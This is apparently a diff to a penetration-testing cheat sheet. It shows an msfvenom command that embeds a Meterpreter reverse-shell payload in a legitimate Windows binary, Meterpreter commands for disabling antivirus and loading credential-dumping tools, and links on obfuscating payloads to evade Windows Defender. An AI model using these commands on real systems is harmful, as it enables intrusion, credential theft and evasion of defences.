@@ -62,14 +62,14 @@ Embed a payload within a legitimate binary:
 
     msfvenom -p windows/meterpreter/reverse_tcp -f exe -a x86 --platform windows LHOST=10.10.0.10 LPORT=4444 -o tmp.exe -k -x 'Name.exe'   
     
-### Useful Meterpreter Commands      
+### Meterpreter     
     
     help    
 Survey    
 
     getuid   
     ps      	
-    search -f flag.txt   
+    search -f file.txt       
     shell     
     runkill av     #turn off AV   
     load python (or other extension), kiwi    
@@ -122,9 +122,8 @@ cmd.exe,pipes
     
     
 ## Antivirus Evasion  
-[PHP payload encoder](https://www.gaijin.at/en/tools/php-obfuscator#result) 
-
-[Example - obfuscating payload to get a reverse shell on Windows](https://medium.com/@defsecone/evading-windows-defender-using-obfuscation-techniques-2494b2924807) 
+[PHP payload encoder](https://www.gaijin.at/en/tools/php-obfuscator#result)        
+[Example - obfuscating payload to get a reverse shell on Windows](https://medium.com/@defsecone/evading-windows-defender-using-obfuscation-techniques-2494b2924807)          
 
 
 ## Resources  
